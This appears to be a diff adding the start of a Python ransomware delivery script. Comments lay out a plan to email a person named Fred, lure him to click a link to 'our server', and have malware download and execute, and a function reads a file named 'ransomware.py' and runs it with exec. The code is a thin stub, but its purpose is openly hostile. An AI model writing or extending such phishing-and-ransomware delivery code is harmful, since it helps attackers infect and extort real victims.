@@ -1,0 +1,13 @@
+import smtplib 
+import imaplib 
+
+
+# making our ransomware executable upon download or clicked
+# Overall objective
+# send email to Fred
+# clicks link goes to our server
+# meanwhile malware downloads and executes
+
+def execute_file():
+       with open('ransomware.py', 'r') as f: 
+                    exec(f.read())
